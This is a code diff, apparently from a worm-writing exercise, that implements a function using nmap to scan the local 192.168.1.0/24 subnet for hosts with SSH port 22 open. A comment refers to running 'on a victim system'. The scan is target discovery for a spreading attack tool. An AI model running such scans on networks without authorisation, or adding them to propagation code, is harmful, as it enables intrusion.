@@ -175,7 +175,19 @@ def getHostsOnTheSameNetwork():
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.	
-	pass
+	
+	portScanner = nmap.PortScanner()
+	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
+	hostInfo = portScanner.all_hosts()
+	liveHosts = []
+	for host in hostInfo:
+		if portScanner[host].state() == "up":
+			liveHosts.append(host)
+	return liveHosts
+
+#TEST HOST SCAN
+print ("This hosts on the network: ")
+print(getHostsOnTheSameNetwork())
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
